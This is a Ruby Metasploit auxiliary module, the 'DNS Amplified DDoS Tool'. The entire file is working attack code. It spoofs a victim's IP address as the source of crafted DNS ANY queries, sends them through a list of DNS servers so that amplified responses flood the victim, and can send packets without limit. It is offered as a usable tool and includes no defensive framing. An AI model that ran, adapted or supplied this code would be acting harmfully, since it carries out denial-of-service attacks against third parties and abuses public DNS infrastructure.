##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Auxiliary::Dos

  def initialize
    super(
      'Name'        => 'DNS Amplified DDoS Tool',
      'Description' => 'DDoS attack using reflected DNS ANY queries for amplification',
      'Author'      => 'Hayden Parker',
      'License'     => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(53),
      OptAddress.new('SHOST', [true, 'The spoofable source address']),
      OptAddress.new('RHOST', [false, 'The DNS server to query']),
      OptPath.new('RHOSTS', [false, 'File containing list of DNS servers to query']),
      OptString.new('DOMAIN', [false,  "The domain to query for"]),
      OptPath.new('DOMAINS', [false,  "File containing domains to query for"]),
      OptString.new('INTERFACE', [true,  "The interface to spew packets from", "eth0"]),
      OptInt.new('SPORT', [false, 'The source port (else randomizes)']),
      OptInt.new('NUM', [true, 'Number of packets to send (zero for unlimited)'])
    ])

    deregister_options('FILTER','PCAPFILE','TIMEOUT','SNAPLEN')
    
    @domains = nil
  end

  def sport
    datastore['SPORT'].to_i.zero? ? rand(0xffff-1024)+1024 : datastore['SPORT'].to_i
  end
  
  def rhost
	if datastore['RHOSTS'] != nil
		return File.open(datastore['RHOSTS']).readlines
	elsif datastore['RHOST'] != nil
		return datastore['RHOST']
	end
  end

  def domain
	if datastore['DOMAINS'] != nil
		if @domains == nil
			@domains = File.open(datastore['DOMAINS']).readlines
		end
		next_domain = @domains.shift
		@domains = @domains << next_domain
		return next_domain.chomp.split(".")
	elsif datastore['DOMAIN'] != nil
		return datastore['DOMAIN'].split(".")
	end
  end
  
  def send_query(dns_query, source, host, interface)
    dns_query.udp_src = sport
	dns_query.ip_daddr = source
	dns_query.payload = ""
	dns_query.payload += "\x24\x1a\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01".force_encoding("ASCII-8BIT")
	host.each do |part|
	  dns_query.payload += [part.size].pack('U').force_encoding("ASCII-8BIT")
	  dns_query.payload += part.force_encoding("ASCII-8BIT")
	end
	dns_query.payload += "\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00".force_encoding("ASCII-8BIT")
	dns_query.recalc
	dns_query.to_w(interface)
  end

  def run
    sent = 0
    num = datastore['NUM']
    print_status("Beginning DNS flood...")

    dns_query = PacketFu::UDPPacket.new
    dns_query.ip_saddr = datastore['SHOST']
    dns_query.udp_dst = datastore['RPORT']
    interface = datastore['INTERFACE']
    
    source = rhost
    if source.class == Array
      while (num <= 0) or (sent < num)
        current_domain = domain
        source.each do |source_ip|
          break if sent >= num unless num <= 0
          send_query(dns_query, source_ip.chomp, current_domain, interface)
          sent += 1
        end
      end
    elsif source.class == String
      while (num <= 0) or (sent < num)
        send_query(dns_query, source, domain, interface)
        sent += 1
      end
	else
      print_error("No DNS server to query defined.  Please set RHOST or RHOSTS.")
	end
	
	print_status("Attack finished (sent #{sent} packets).")
  end
end
